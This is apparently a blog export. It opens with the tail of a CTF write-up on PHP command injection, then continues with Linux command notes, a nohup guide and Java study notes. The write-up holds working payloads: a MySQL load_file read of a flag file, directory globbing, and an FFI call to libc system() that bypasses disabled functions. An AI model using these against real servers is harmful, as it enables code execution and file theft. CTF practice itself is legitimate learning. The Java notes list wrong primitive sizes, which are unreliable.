<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><p>第一遍扫描目录<br>c&#x3D;$a&#x3D;new DirectoryIterator(“glob:&#x2F;&#x2F;&#x2F;*”);foreach($a as $f){echo($f-&gt;__toString().’ ‘);}exit(0);然后发现下面有一个readflag肯定是要调用这个,不会做，看了这个FFI拓展挺神奇的，说谁php7.4版本以上才有，大家想了解可以看看下面的参考链接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span>=<span class="title class_">FFI</span>::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux简单总结</title>
    <url>/Linux/Linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>收集一些常用的，免得我忘记了ε&#x3D;ε&#x3D;ε&#x3D;(<del>￣▽￣)</del></p>
<span id="more"></span>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -m                             显示机器的处理器架构</span><br><span class="line">uname -r                             显示正在使用的内核版本</span><br><span class="line">dmidecode -q                         显示硬件系统部件</span><br><span class="line">(SMBIOS / DMI) hdparm -i /dev/hda    罗列一个磁盘的架构特性</span><br><span class="line">hdparm -tT /dev/sda                  在磁盘上执行测试性读取操作系统信息</span><br><span class="line">arch                                 显示机器的处理器架构</span><br><span class="line">uname -m                             显示机器的处理器架构</span><br><span class="line">uname -r                             显示正在使用的内核版本</span><br><span class="line">dmidecode -q                         显示硬件系统部件 - (SMBIOS / DMI)</span><br><span class="line">hdparm -i /dev/hda                   罗列一个磁盘的架构特性</span><br><span class="line">hdparm -tT /dev/sda                  在磁盘上执行测试性读取操作</span><br><span class="line">cat /proc/cpuinfo                    显示CPU info的信息</span><br><span class="line">cat /proc/interrupts                 显示中断</span><br><span class="line">cat /proc/meminfo                    校验内存使用</span><br><span class="line">cat /proc/swaps                      显示哪些swap被使用</span><br><span class="line">cat /proc/version                    显示内核的版本</span><br><span class="line">cat /proc/net/dev                    显示网络适配器及统计</span><br><span class="line">cat /proc/mounts                     显示已加载的文件系统</span><br><span class="line">lspci -tv                            罗列 PCI 设备</span><br><span class="line">lsusb -tv                            显示 USB 设备</span><br><span class="line">date                                 显示系统日期</span><br><span class="line">cal 2007                             显示2007年的日历表</span><br><span class="line">date 041217002007.00                 设置日期和时间 - 月日时分年.秒</span><br><span class="line">clock -w                             将时间修改保存到 BIOS</span><br></pre></td></tr></table></figure>

<h2 id="关机-and-重启"><a href="#关机-and-重启" class="headerlink" title="关机 and 重启"></a>关机 and 重启</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now             关闭系统(1)</span><br><span class="line">init 0                      关闭系统(2)</span><br><span class="line">telinit 0                   关闭系统(3)</span><br><span class="line">shutdown -h hours:minutes &amp; 按预定时间关闭系统</span><br><span class="line">shutdown -h +10             10分钟后关机</span><br><span class="line">shutdown -c                 取消按预定时间关闭系统</span><br><span class="line">shutdown -r now             重启</span><br><span class="line">reboot                      重启</span><br><span class="line">logout                      注销</span><br></pre></td></tr></table></figure>

<h2 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home                      进入 / home 目录</span><br><span class="line">cd ..                         返回上一级目录</span><br><span class="line">cd ../..                      返回上两级目录</span><br><span class="line">cd                            进入个人的主目录</span><br><span class="line">cd ~user1                     进入个人的主目录</span><br><span class="line">cd -                          返回上次所在的目录</span><br><span class="line">pwd                           显示工作路径</span><br><span class="line">ls                            查看目录中的文件</span><br><span class="line">ls -F                         查看目录中的文件</span><br><span class="line">ls -l                         显示文件和目录的详细资料</span><br><span class="line">ls -a                         显示隐藏文件</span><br><span class="line">ls *[0-9]*                    显示包含数字的文件名和目录名</span><br><span class="line">tree                          显示文件和目录由根目录开始的树形结构(1)</span><br><span class="line">lstree                        显示文件和目录由根目录开始的树形结构(2)</span><br><span class="line">mkdir dir1                    创建一个叫做 dir1 的目录</span><br><span class="line">mkdir dir1 dir2               同时创建两个目录</span><br><span class="line">mkdir -p /tmp/dir1/dir2       创建一个目录树</span><br><span class="line">mv dir1 new_dir               重命名/移动 一个目录</span><br><span class="line">cp file1 file2                复制一个文件</span><br><span class="line">cp dir/* .                    复制一个目录下的所有文件到当前工作目录</span><br><span class="line">cp -a /tmp/dir1 .             复制一个目录到当前工作目录</span><br><span class="line">cp -a dir1 dir2               复制一个目录</span><br><span class="line">ln -s file1 lnk1              创建一个指向文件或目录的软链接</span><br><span class="line">ln file1 lnk1                 创建一个指向文件或目录的物理链接</span><br><span class="line">touch -t 0712250000 file1     修改一个文件或目录的时间戳 </span><br></pre></td></tr></table></figure>

<h2 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -name *liuyazhuang*     查找当前目录下名称中含有&quot;liuyazhuang&quot;的文件</span><br><span class="line">find / -name *.conf            查找根目录下（整个硬盘）下后缀为.conf的文件</span><br><span class="line">find / -perm 777               查找所有权限是777的文件</span><br><span class="line">find / -type d                 返回根目录下所有的目录</span><br><span class="line">whereis halt 显示一个二进制文件、源码或man的位置</span><br><span class="line">which halt 显示一个二进制文件或可执行文件的完整路径</span><br></pre></td></tr></table></figure>

<h2 id="文件的权限-使用-“-”-设置权限，使用-“-”-用于取消"><a href="#文件的权限-使用-“-”-设置权限，使用-“-”-用于取消" class="headerlink" title="文件的权限  使用 “+” 设置权限，使用 “-” 用于取消"></a>文件的权限  使用 “+” 设置权限，使用 “-” 用于取消</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lh                      显示权限</span><br><span class="line">ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示</span><br><span class="line">chmod ugo+rwx directory1    设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限</span><br><span class="line">chmod go-rwx directory1     删除群组(g)与其他人(o)对目录的读写执行权限</span><br><span class="line">chown user1 file1           改变一个文件的所有人属性</span><br><span class="line">chown -R user1 directory1   改变一个目录的所有人属性并同时改变改目录下所有文件的属性</span><br><span class="line">chgrp group1 file1          改变文件的群组</span><br><span class="line">chown user1:group1 file1    改变一个文件的所有人和群组属性</span><br><span class="line">find / -perm -u+s           罗列一个系统中所有使用了SUID控制的文件</span><br><span class="line">chmod u+s /bin/file1        设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限</span><br><span class="line">chmod u-s /bin/file1        禁用一个二进制文件的 SUID位</span><br><span class="line">chmod g+s /home/public      设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的</span><br><span class="line">chmod g-s /home/public      禁用一个目录的 SGID 位</span><br><span class="line">chmod o+t /home/public      设置一个文件的 STIKY 位 - 只允许合法所有人删除文件</span><br><span class="line">chmod o-t /home/public      禁用一个目录的 STIKY 位</span><br><span class="line">chmod +x                    文件路径 为所有者、所属组和其他用户添加执行的权限</span><br><span class="line">chmod -x                    文件路径 为所有者、所属组和其他用户删除执行的权限</span><br><span class="line">chmod u+x                   文件路径 为所有者添加执行的权限</span><br><span class="line">chmod g+x                   文件路径 为所属组添加执行的权限</span><br><span class="line">chmod o+x                   文件路径 为其他用户添加执行的权限</span><br><span class="line">chmod ug+x                  文件路径 为所有者、所属组添加执行的权限</span><br><span class="line">chmod =wx                   文件路径 为所有者、所属组和其他用户添加写、执行的权限，取消读权限</span><br><span class="line">chmod ug=wx                 文件路径 为所有者、所属组添加写、执行的权限，取消读权限</span><br></pre></td></tr></table></figure>

<h2 id="文件的特殊属性-，使用-“-”-设置权限，使用-“-”-用于取消"><a href="#文件的特殊属性-，使用-“-”-设置权限，使用-“-”-用于取消" class="headerlink" title="文件的特殊属性 ，使用 “+” 设置权限，使用 “-” 用于取消"></a>文件的特殊属性 ，使用 “+” 设置权限，使用 “-” 用于取消</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +a file1 只允许以追加方式读写文件</span><br><span class="line">chattr +c file1 允许这个文件能被内核自动压缩/解压</span><br><span class="line">chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件</span><br><span class="line">chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接</span><br><span class="line">chattr +s file1 允许一个文件被安全地删除</span><br><span class="line">chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘</span><br><span class="line">chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件</span><br><span class="line">lsattr          显示特殊的属性</span><br></pre></td></tr></table></figure>

<h2 id="打包-and-压缩文件"><a href="#打包-and-压缩文件" class="headerlink" title="打包 and 压缩文件"></a>打包 and 压缩文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip   文件名.zip    压缩文件</span><br><span class="line">gzip  文件名        压缩文件</span><br><span class="line">gizp  –l 文件名.gz：显示压缩率</span><br><span class="line">unzip 文件名.zip    解压文件</span><br><span class="line">tar：归档文件</span><br><span class="line">tar -cvf out.tar liuyazhuang  打包一个归档（将文件&quot;liuyazhuang&quot;打包成一个归档）</span><br><span class="line">tar -xvf liuyazhuang.tar     释放一个归档（释放liuyazhuang.tar归档）</span><br><span class="line">tar -cvzf backup.tar.gz/etc  </span><br><span class="line">-z参数将归档后的归档文件进行gzip压缩以减少大小。</span><br><span class="line">-c：创建一个新tar文件</span><br><span class="line">-v：显示运行过程的信息</span><br><span class="line">-f：指定文件名</span><br><span class="line">-z：调用gzip压缩命令进行压缩</span><br><span class="line">-t：查看压缩文件的内容</span><br><span class="line">-x：解开tar文件</span><br><span class="line">tar  -cvf test.tar      *：将所有文件打包成test.tar扩展名.tar需自行加上</span><br><span class="line">tar  -zcvf test.tar.gz  *：将所有文件打包成test.tar再用gzip命令压缩</span><br><span class="line">tar -tf   test.tar ：   查看test.tar文件中包括了哪些文件</span><br><span class="line">tar -xvf test.tar       将test.tar解开</span><br><span class="line">tar -zxvf foo.tar.gz    解压缩</span><br></pre></td></tr></table></figure>

<h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat file1 从第一个字节开始正向查看文件的内容</span><br><span class="line">tac file1 从最后一行开始反向查看一个文件的内容</span><br><span class="line">more file1 查看一个长文件的内容</span><br><span class="line">less file1 类似于 more 命令，但是它允许在文件中和正向操作一样的反向操作</span><br><span class="line">head -2 file1 查看一个文件的前两行</span><br><span class="line">tail -2 file1 查看一个文件的最后两行</span><br><span class="line">tail -f /var/log/messages 实时查看被添加到一个文件中的内容</span><br></pre></td></tr></table></figure>

<h2 id="列出目录内容"><a href="#列出目录内容" class="headerlink" title="列出目录内容"></a>列出目录内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -a：显示所有文件（包括隐藏文件）；</span><br><span class="line">ls -l：显示详细信息；</span><br><span class="line">ls -R：递归显示子目录结构；</span><br><span class="line">ls -ld：显示目录和链接信息；</span><br><span class="line">ctrl+r：历史记录中所搜命令（输入命令中的任意一个字符）；</span><br><span class="line">Linux中以.开头的文件是隐藏文件；</span><br><span class="line">pwd:显示当前目录</span><br></pre></td></tr></table></figure>

<h2 id="查看文件的类型"><a href="#查看文件的类型" class="headerlink" title="查看文件的类型"></a>查看文件的类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:查看文件的类型</span><br></pre></td></tr></table></figure>

<h1 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h1><p>grep：功能：在文件中搜索匹配的字符并进行输出</p>
<p>格式：grep[参数] &lt;要找的字串&gt; &lt;要寻找字 串的源文件&gt;<br>greplinux test.txt：搜索test.txt文件中字符串linux并输出</p>
<h1 id="ln命令"><a href="#ln命令" class="headerlink" title="ln命令"></a>ln命令</h1><p>功能：在文件和目录之间建立链接</p>
<p>格式：<code>ln [参数] &lt;源文件或目录&gt; &lt;目标文件或目录&gt;</code></p>
<p>链接分<code>软链接</code>和<code>硬链接</code></p>
<p>1.软链接<br>ln–s &#x2F;usr&#x2F;share&#x2F;do  doc ：创建一个链接文件doc并指向目录&#x2F;usr&#x2F;share&#x2F;do</p>
<p>2.硬链接<br>ln  &#x2F;usr&#x2F;share&#x2F;test  hard：创建一个硬链接文件hard，这时对于test文件对应 的存储区域来说，又多了一个文件指向它</p>
<h1 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h1><p>vim拥有三种模式：命令模式、插入模式、ex模式</p>
<ul>
<li><p>命令模式（常规模式）<br>vim启动后，默认进入命令模式，任何模式都可以通过esc键回到命令模式（可以多按几次），命令模式下可以键入不同的命令完成选择、复制、粘贴、撤销等操作。<br>命名模式常用命令如下：<br>i : 在光标前插入文本；<br>o:在当前行的下面插入新行；<br>dd:删除整行；<br>yy：将当前行的内容放入缓冲区（复制当前行）<br>n+yy :将n行的内容放入缓冲区（复制n行）<br>p:将缓冲区中的文本放入光标后（粘贴）<br>u：撤销上一个操作<br>r:替换当前字符<br>&#x2F; 查找关键字</p>
</li>
<li><p>插入模式<br>在命令模式下按 “ i “键，即可进入插入模式，在插入模式可以输入编辑文本内容，使用esc键可以返回命令模式。</p>
</li>
<li><p>ex模式<br>在命令模式中按” : “键可以进入ex模式，光标会移动到底部，在这里可以保存修改或退出vim.<br>ext模式常用命令如下：<br>:w ：保存当前的修改<br>:q ：退出<br>:q! ：强制退出，保存修改<br>:x  :保存并退出，相当于:wq<br>:set number 显示行号<br>:! 系统命令  执行一个系统命令并显示结果<br>:sh ：切换到命令行，使用ctrl+d切换回vim</p>
</li>
</ul>
]]></content>
      <categories>
        <category>指令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>nohup命令</title>
    <url>/Linux/nohup%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。</p>
<span id="more"></span>

<h1 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup Command [ Arg … ] [ &amp; ]</span><br></pre></td></tr></table></figure>

<p>该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。<code>nohup</code>就是不挂起的意思（<code>no hang up</code>）。</p>
<p><code>nohup</code> 运行由 <code>Command</code> 和相关的 <code>Arg</code> 参数指定的命令，忽略所有挂断（<code>SIGHUP</code>）信号。要运行后台中的 <code>nohup</code> 命令，添加 <code>&amp;</code> （ 表示 <code>and</code> 的符号）到命令的尾部。</p>
<p>如果使用 <code>nohup</code> 命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为 nohup.out 的文件中，除非另外指定了输出文件。</p>
<h1 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，运行命令 <code>java -jar adapter-minisite.jar</code> 输入参数 <code>/tomcat-1</code> 和 <code>/tomcat-2</code>，输出被重定向到 <code>logs.txt</code> 文件中。</p>
<h1 id="退出任务"><a href="#退出任务" class="headerlink" title="退出任务"></a>退出任务</h1><p>如果运行的任务在当前 <code>shell</code> 终端，可以通过 <code>jobs</code> 命令查询相关信息，并且杀掉进程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看当前 shell 终端的后台运行任务进程信息</span><br><span class="line">$ jobs</span><br><span class="line">[1]+ Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"># 杀掉任务号</span><br><span class="line">$ kill %1</span><br><span class="line"></span><br><span class="line"># 或着找到 pid</span><br><span class="line">$ jobs -l</span><br><span class="line">[1]+ 11076 Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">$ kill 11076</span><br><span class="line"></span><br><span class="line"># 或着</span><br><span class="line">$ fg %n # 置为前端运行</span><br><span class="line"></span><br><span class="line">Ctrl + c # 退出</span><br></pre></td></tr></table></figure>

<p>如果非当前 <code>shell</code> 终端，可以通过 <code>ps auxf | grep adapter-minisite</code> 获取 <code>pid</code> 然后 <code>kill pid</code>。</p>
]]></content>
      <categories>
        <category>指令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA知识点整理</title>
    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/JAVA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>语言学习笔记</p>
<span id="more"></span>

<h1 id="基础知识篇"><a href="#基础知识篇" class="headerlink" title="基础知识篇"></a>基础知识篇</h1><p>JAVA是一个强语言类型，<mark>切区分大小写！</mark></p>
<ul>
<li>public –&gt;表示公开的</li>
<li>static –&gt;表示静态的</li>
<li>void    –&gt;表示空</li>
<li>main    –&gt;主方法</li>
<li>class    –&gt;表示定义一个类</li>
</ul>
<p>简单程序示例</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sL8zdA.png"></p>
<ol>
<li>一个JAVA源文件可以定义多个class</li>
<li>一个JAVA源文件当中的public的class不是必须定义的<mark>public定义的class名字必须与类名一致，所有一个包中的一个公开的类只能有一个</mark></li>
<li>一个class会定义，或者产生一个xxx.class字节码文件（储存代码片段）</li>
</ol>
<p><img src="https://s3.ax1x.com/2021/01/25/sLGYw9.png"></p>
<p>命名法<br>类名，接口名：首字母大写，其余小写<br>变量名，方法名：首字母小写，其余大写<br>常量名：全部大写<br>要见名知意，遵守驼峰命名法<br>驼峰命名法：当命名要用2个及其以上单词时，用下划线或者首字母大写分开<br>写代码要符合规范，加空格的位置要注意加</p>
<ol>
<li>小容量转换成大容量，称为自动类型转换机制</li>
<li>long2&#x3D;123486453486L加L是说明是8字节<br>大容量转换成小容量加强制转换类型符，但是会损失精度 –&gt;int y &#x3D; (int) x</li>
</ol>
<p>注释<br>与C一样，但是如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 比较专业的注释方法，该注释信息会被javacloc.exe工具解析</span></span><br><span class="line"><span class="comment"> * 提取并生成帮助文档(即说明书)</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>占用空间</p>
<ol>
<li>byte————  2 [-128~127]</li>
<li>short————4</li>
<li>int————8</li>
<li>long————4</li>
<li>float————4</li>
<li>doubie————8</li>
<li>boolean————1</li>
<li>char————2  [0~655302]</li>
</ol>
<p>三元运算符&#x2F;三目运算符&#x2F;条件运算符<br>语法规则<br>布尔表达式？表达式：表达式2</p>
<p>逻辑运算符要去两边都是布尔类型</p>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><ol>
<li>方法体中不能在定义方法</li>
<li>方法体定义在类体中</li>
<li>规范；一个java文件只定义一个class</li>
<li>return后面不能放代码</li>
</ol>
<p>在JVM内存划分上有三块主要内存空间</p>
<ol>
<li>方法体内存</li>
<li>栈内存</li>
<li>堆内存</li>
</ol>
<p>1，方法片段属于class字节码文件的一部分，字节码文件在类加载的时候，将其存放在方法区中。所以JVM中的三块主要内存中方法区内存最先有数据。存放了代码片段。<br>2，代码片段虽然在方法区内存当中存有片段只有一份，但是可以被重复调用。每一次调用这个方法的时候，需要给该方法分配独立的活动场所，在栈内存中分配。<br>3，方法在调用的瞬间，会给该方法分配内存空间，会在栈中发生压栈动作，方法结束后給该方法分配内存空间收回，方法结束压栈。</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLJnne.png"></p>
<p>压栈：给该方法分配内存空间<br>弹栈：释放该方法内存空间<br>栈帧：永远指向栈顶元素<br>  栈顶元素处于活跃状态，其他元素静止<br>栈数据结构，存储数据结构特点<br>遵守：先进后出，后进先出</p>
<p>方法重载<br>功能相似，尽可能让方法名相同<br>只和方法名+参数列表有关系<br>方法名可以相同，但是其内的参数类型要不同</p>
<p>方法的递归调用<br>1，方法自身调用自身<br>2，递归必须有结束条件，没有结束条件一定会发生，栈内存溢出错误<br>3，即使有结束条件，也有可能发生栈内存溢出错误，因为递归太深了</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLNQAJ.png"></p>
<p>弹栈时逐级相加</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLYwrD.png"></p>
<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p><mark>优点：耦合度低，扩展力强。更容易解决现实世界中更复杂的业务逻辑</p>
<p>缺点：前期投入成本高，需要进行独立体的抽取，大量系统分析与设计</p>
<p>关注点是对象（独立体）能完成那些的功能</p>
<p>C语言纯面向过程，c++半面向对象，java纯面向对象</p>
<p>人在认识世界通常以面向对象的方式<br></mark></p>
<p>三大特征<br>—封装<br>—继承<br>—多态</p>
<p>采用面向对象的方式开发一个软件，生命周期当中<br>—面向对象的分析：OOA<br>—面向对象的设计：OOD<br>—面向对象的编程：OOP</p>
<h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>类：类现在现实世界中是不存在的一个模板，是一个概念。是人类大脑抽象的结果<br>类代表了一类事物<br>在现实世界当中，对象A与对象B之间具有的共同特征，进行抽象总结出了一个模板。这个模板被称为类</p>
<p>对象：对象是实际存在的个体，现实世界当中实际存在。</p>
<p><mark>类–&gt;【实例化】–&gt;对象–&gt;【抽象】–&gt;类</mark></p>
<p><mark>注意<br>状态和动作特征当具体到某一个对象后，发现最终结果可能不一样。<br>对象和对象之间有共同的特征，但是具体到对象以后有数据差异</mark></p>
<p>类的定义<br>[修饰符列表]class 类名{<br>属性;<br>方法;<br>}<br>属性通常采用一个变量的形式来定义</p>
<p>JAVA语言中所有class都属于引用数据类型<br>类体 &#x3D; 属性 + 方法<br>实例变量：不能通过类直接访问<br>对象又被称为实例，实例变量又被称为对象变量（对象级别变量）<br>实例化对象的语法：new 类名（）<br>new运算符的作用是创建对象，在JVM堆内存当中开辟新内存空间<br>堆内存：new的对象在堆内存中的存储</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLtuFA.png"></p>
<p>在对象中分边定义两个引用，分边指向两个对象，则知其也知其二</p>
<p>局部变量：方法体中声明<br>成员变量：方法体外声明<br>实例变量：前边修饰符无static<br>静态变量：前边修饰符有sta</p>
<p>三块内存当中变化最频繁的是栈内存，最先有数据的是方法去内存，垃圾回收器主要针对的是堆内存。</p>
<p>垃圾回收器（自动回收垃圾机制，GC机制）<br>当堆内存中的Java对象称为垃圾数据时候，会被垃圾回收器回收。</p>
<p>堆内存中的java对象变成垃圾的条件<br>没有更多的引用指向它的时候<br>这个对象无法被访问，因为访问对象只能通过引用方式访问</p>
<p>静态变量存储在方法区内存当中<br>一个线程，一个栈内存<br>栈中主要存储方法体的局部变量</p>
<h1 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h1><ol>
<li><p>构造方法又被称为构造函数&#x2F;构造器</p>
</li>
<li><p>构造方法语句<br>[修饰符列表]构造方法名（形式参数列表）{<br>方法体；<br>}</p>
</li>
<li><p>对于构造方法来说，“返回类型不需要指定，并且也不能写void”，写上了就变成普通方法了</p>
</li>
<li><p>调用：new 构造方法名（实参列表）<br>构造方法的方法名与类名保持一致</p>
</li>
<li><p>构造方法有返回值，并且返回值类型是构造方法所在类的类型</p>
</li>
<li><p>当一个类中没有定义任何构造方法的话，系统默认给该类提供一个无参数的构造方法，这个构造方法被称为缺省构造器</p>
</li>
<li><p>构造方法支持重载机制</p>
</li>
<li><p>当一个类现实的构造方法定义了出来，那么系统不在为这个类提供缺省构造器。！！!开发时手动为当前类提供无参数构造方法。因为无参构造方法太常用了</p>
</li>
<li><p>实例变量没有手动赋值的时候系统默认赋值，类加载了代码片段，还没来的及创建对象。所有此时实例变量没有初始化</p>
</li>
</ol>
<h1 id="参数的传递"><a href="#参数的传递" class="headerlink" title="参数的传递"></a>参数的传递</h1><p>参数传递实际上传递的是变量中保持的具体值（字面值或者内存地址）</p>
<h1 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h1><ol>
<li>this是一个引用，this是一个变量，this变量中保存了内存地址指向了自身，this存储在JVM堆内存JAVA对象内部。</li>
<li>this代表当前正在执行这个行为的对象，当对象C1时，this是C1，当对象C2时this是C2</li>
<li>创建100个java对象，就有100this</li>
<li>this可以出现在实例方法当中，this指向当前正在执行这个动作的对象（this代表当前对象）</li>
<li><mark>this多数情况下都可以不写</mark></li>
<li>this不能再tsatic中使用</li>
</ol>
<p>在带siatic的方法中不能直接访问实例变量，实例方法。<br>因为实例变量和实例方法都需要变量的存在<br>而sitaic方法当中是没有this的。也就是说当前对象是不存在的<br>自然也是无法访问当前对象的实例变量和实例方法</p>
<p><mark>“类名.”可以省略</mark></p>
<ol>
<li><p>this.  –&gt;什么时候不能省略<br>用来区分局部变量和实例变量的时候，”this.”不能省略</p>
</li>
<li><p>this可以在那里使用<br>一，可以使用在实例方法当中，代表当前对象<br>二，可以使用在构造方法当中，通过当前的构造方法调用其他的构造方法【语法格式：this(实参)】</p>
</li>
</ol>
<p>在封装的地方”this.”再在构造函数处一模一样的”this.”——并不是无意义的，当你想修改对象的值的时候。</p>
<h1 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h1><p>什么时候成员变量声明为实例变量<br>所以对象都有这个属性，但这个属性的值会随着对象的变化而变化【不同对象的这个值不同】</p>
<p>什么时候成员变量声明为静态变量<br>所以对象都有这个属性，并且所有对象的这个属性的值是一样的，建议定义为静态变量，节省内存的开销。</p>
<p><mark>静态变量在类加载的时候初始化，内存在方法区中开辟。访问的时候不需要创建对象，直接使用”类名.静态变量名”的方式访问</mark></p>
<ol>
<li>可以使用static关键字来定义”静态代码块”：<br>语法规则：<br>static{<br>java语句;<br>}</li>
<li>静态代码块在类加载时执行，并且只执行一次</li>
<li>静态代码块在一个类中可以加载多个，并且遵循自上而下的顺序依次执行</li>
<li>静态代码块的作用是什么？怎么用？用在那儿？什么时候用？</li>
</ol>
<p>—这当然和具体的需要有关，例如项目中要求在类加载的时刻&#x2F;时机执行代码完成日志的记录，那么这段代码日志的代码就可以编写到静态代码块当中，完成日志。</p>
<p>—静态代码块是java为程序员准备的一个特殊时刻，这个特殊的时刻被称为类加载时刻。若希望在此刻执行一段特殊的程序，这段程序可以直接放到静态代码块当中</p>
<ol start="5">
<li>通常在静态代码块当中完成预备工作，先完成数据的准备工作，例如：初始化连接池，解析XML配置文件</li>
</ol>
<h1 id="实例语句块"><a href="#实例语句块" class="headerlink" title="实例语句块"></a>实例语句块</h1><p>实例语句块&#x2F;代码块</p>
<ol>
<li>实例代码块可以编写多个，也是遵循自上而下的顺序依次执行。</li>
<li>实例代码块在构造方法执行之前执行，构造方法一次执行，实例代码块对于执行一次。</li>
<li>实例代码块也是java语言为程序员准备一个特殊的时机，这个特殊时机被称为：对象初始化时机</li>
</ol>
<h1 id="方法的覆盖"><a href="#方法的覆盖" class="headerlink" title="方法的覆盖"></a>方法的覆盖</h1><ol>
<li>方法覆盖又叫方法的重写</li>
</ol>
<p>需要使用的情况<br>2. 当父类中的方法已经无法满足当前子类的需求，子类有必要将父类中继承过来的方法进行重新编写，这个重新编写的过程称为方法重写&#x2F;方法覆盖。</p>
